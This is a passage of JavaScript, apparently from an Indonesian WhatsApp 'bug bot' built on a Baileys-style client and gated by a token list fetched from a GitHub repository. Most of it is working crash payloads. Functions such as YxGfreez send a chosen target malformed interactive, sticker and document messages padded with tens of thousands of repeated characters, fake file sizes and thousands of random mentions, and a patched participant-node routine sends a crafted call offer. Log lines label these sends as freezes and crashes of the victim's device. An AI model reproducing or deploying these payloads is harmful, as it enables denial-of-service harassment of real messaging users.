              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };
    const payload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "ZunnFlow", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        },
      },
    },
  };

const msg2 = {
   interactiveResponseMessage: {
          body: {
            text: "maklo",
            format: "EXTENTION_1",
          },
          nativeFlowResponseMessage: {
            name: "review_and_pay",
            paramsJson: "\x10".repeat(5000),
            version: 4,
          },
          contextInfo: {
            participant: target,
            stanzaId: "status@broadcast",
            mentionedJid: ["181818181818@s.whatsapp.net"],
            forwardingScore: 888,
            isForwarded: true,
            businessMessageForwardInfo: {
              businessOwnerJid: "111111111111@s.whatsapp.net",
            },
            quotedMessage: {
              callLogMessage: {
                isVideo: true,
                callOutCome: 1,
                duration: 135,
                participantIds: [],
              },
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "999999999@newsletter",
              newsletterName: "Bokep Mas?",
              contentType: "UPDATE",
              serverMessageId: 2,
             }
           }
         }
       };
    const Junzz = {
     interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo="),
                        fileLength: "9999999999999",
                        pageCount: 1316134911,
                        mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec="),
                        fileName: "BlankFile" + "𑜦𑜠".repeat(25000),
                        fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo="),
                        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1726867151",
                        contactVcard: false,
                        jpegThumbnail: null,
                    }
                },
                body: { text: "ꦾ".repeat(10000) },
                contextInfo: {
                    stanzaId: "metawai_id",
                    forwardingScore: 999,
                    participant: target,
                    mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                }
            }
        };
    for (const msg of [msg, DelayIn, msg2, Junzz]) {
    await Abim.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.red(`SEMESTA - JAYA SUCCES SENDING BULLDO BLANK ${target}`));
  }
}
async function YxGfreez(target) {
 const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };
   const lahjir = {
     interactiveMessage: {
            header: {
              title: " Freeze Ui Hard",
              subtitle: "ꦾ".repeat(10000),
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(20000)
            },
            footer: {
              text: "ꦾ".repeat(20000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "ꦾ".repeat(20000),
                    sections: [
                      {
                        title: "ꦾ".repeat(5000),
                        rows: [
                          { 
                            title: "ꦾ".repeat(5000), 
                            description: "ꦾ".repeat(5000), 
                            id: "ꦾ".repeat(2000) 
                          },
                          { 
                            title: "ꦾ".repeat(5000), 
                            description: "ꦾ".repeat(5000), 
                            id: "ꦾ".repeat(2000) 
                          },
                          { 
                            title: "ꦾ".repeat(5000), 
                            description: "ꦾ".repeat(5000), 
                            id: "ꦾ".repeat(2000) 
                          }
                        ]
                      },
                      {
                        title: "ꦾ".repeat(20000) + "YxG-CrashFreeze",
                        rows: [
                          { 
                            title: "ꦾ".repeat(5000), 
                            description: "ꦾ".repeat(5000), 
                            id: "ꦾ".repeat(2000) 
                          },
                          { 
                            title: "YxG - Freeze Ajg", 
                            description: "\u0000".repeat(5000), 
                            id: "ꦾ".repeat(2000) 
                          }
                        ]
                      }
                    ]
                  })
                }
              ]
            }
          }
        };
     await Abim.relayMessage(target, msg.message, { messageId: msg.key?.id });
     await Abim.relayMessage(target, lahjir.message, { messageId: lahjir.key?.id });
     console.log(chalk.red(`〔𝐘𝐱𝐆 - 𝐈𝐍𝐅𝐌 : ${target} 𝐀𝐦𝐩𝐚𝐬 𝐓𝐮𝐡 Device〕`));
   }
   
    const javhd = janda();
    const jepang = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    const yntkts = encodeWAMessageFn;

    Abim.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      const patched = await (Abim.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      const ywdh = Array.isArray(patched) ? patched : recipientJids.map(j => ({ recipientJid: j, message: patched }));

      const { id: meId, lid: meLid } = Abim.authState.creds.me;
      const omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(ywdh.map(async ({ recipientJid: j, message: msg }) => {
        const { user: targetUser } = jidDecode(j);
        const { user: ownUser } = jidDecode(meId);
        const isOwn = targetUser === ownUser || targetUser === omak;
        const y = j === meId || j === meLid;
        if (dsmMessage && isOwn && !y) msg = dsmMessage;

        const bytes = jepang(yntkts ? yntkts(msg) : Buffer.from([]));
        return javhd.mutex(j, async () => {
          const { type, ciphertext } = await Abim.signalRepository.encryptMessage({ jid: j, data: bytes });
          if (type === "pkmsg") shouldIncludeDeviceIdentity = true;
          return {
            tag: "to",
            attrs: { jid: j },
            content: [{ tag: "enc", attrs: { v: "2", type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let devices = [];
    try {
      devices = (await Abim.getUSyncDevices([jid], false, false))
        .map(({ user, device }) => `${user}${device ? ":" + device : ""}@s.whatsapp.net`);
    } catch {
      devices = [jid];
    }

    try { await Abim.assertSessions(devices); } catch {}

    let { nodes: destinations, shouldIncludeDeviceIdentity } = { nodes: [], shouldIncludeDeviceIdentity: false };
    try {
      const created = await Abim.createParticipantNodes(devices, { conversation: "y" }, { count: "0" });
      destinations = created?.nodes ?? [];
      shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
    } catch { destinations = []; shouldIncludeDeviceIdentity = false; }

    const otaxkiw = {
      tag: "call",
      attrs: { to: jid, id: Abim.generateMessageTag ? Abim.generateMessageTag() : crypto.randomBytes(8).toString("hex"), from: Abim.user?.id || Abim.authState?.creds?.me?.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": Abim.user?.id || Abim.authState?.creds?.me?.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations }
        ]
      }]
    };

    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentityFn) {
      try {
        const deviceIdentity = encodeSignedDeviceIdentityFn(Abim.authState.creds.account, true);
        otaxkiw.content[0].content.push({ tag: "device-identity", attrs: {}, content: deviceIdentity });
      } catch (e) {}
    }

    await Abim.sendNode(otaxkiw);

    return { success: true, target: jid, method: "sendNode" };
  } catch (err) {
    return { success: false, error: err?.message ?? String(err) };
  }
}

const GH = require("./github");
const TOKEN_DATABASE_URL =
  `https://api.github.com/repos/${GH.REPO_OWNER}/${GH.REPO_NAME}/contents/${GH.FILE_PATH}?ref=${GH.BRANCH}`;

// === FUNGSI START ===
async function verifyGithubToken() {
  try {
    const response = await axios.get(TOKEN_DATABASE_URL, {
      headers: {
        // format header yang aman/umum
        Authorization: `token ${GH.GITHUB_TOKEN}`,
        Accept: "application/vnd.github+json",
      },
    });

    if (!response?.data?.content) {
      console.error(chalk.red.bold("Database token tidak ditemukan / response tidak valid."));
      process.exit(1);
    }

    const fileContent = Buffer.from(response.data.content, "base64").toString("utf-8");

    let tokensData;
    try {
      tokensData = JSON.parse(fileContent);
    } catch (e) {
      console.error(chalk.red.bold("Isi token.json bukan JSON valid."));
      process.exit(1);
    }

    if (!tokensData.tokens || !Array.isArray(tokensData.tokens) || tokensData.tokens.length === 0) {
      console.error(chalk.red.bold("Database token kosong atau tidak valid."));
      process.exit(1);
    }

    // BOT_TOKEN harus sudah ada di project kamu (misal dari config/env)
    if (typeof BOT_TOKEN !== "string" || !BOT_TOKEN.trim()) {
      console.error(chalk.red.bold("BOT_TOKEN belum di-set / kosong."));
      process.exit(1);
    }

    if (!tokensData.tokens.includes(BOT_TOKEN)) {
      console.log(chalk.redBright.bold("╭─────────────────────────────╮"));
      console.error(chalk.redBright.bold(`│${chalk.white("❌ Token Kamu Tidak Terdaftar.")}`));
      console.log(chalk.redBright.bold("╰─────────────────────────────╯"));
      process.exit(1);
    }

    console.log(chalk.redBright.bold("╭─────────────────────────────╮"));
    console.log(chalk.redBright.bold(`│${chalk.white("🎮 Token Kamu Terverifikasi")}`));
    console.log(chalk.redBright.bold("╰─────────────────────────────╯"));
  } catch (error) {
    const msg = error?.response?.data?.message || error?.message || String(error);
    console.error(chalk.red("Terjadi kesalahan saat mengakses database token:"), msg);
    process.exit(1);
  }
}

// ✅ Jalankan verifikasi dulu, baru start bot (rapi: 1 IIFE aja)
(async () => {
  await verifyGithubToken();

  console.log(
    chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white("🛡️ SYNC MELUNCUR..")}
╰───────────────────────────╯
`)
  );

  startSesi();
  bot.launch();
})();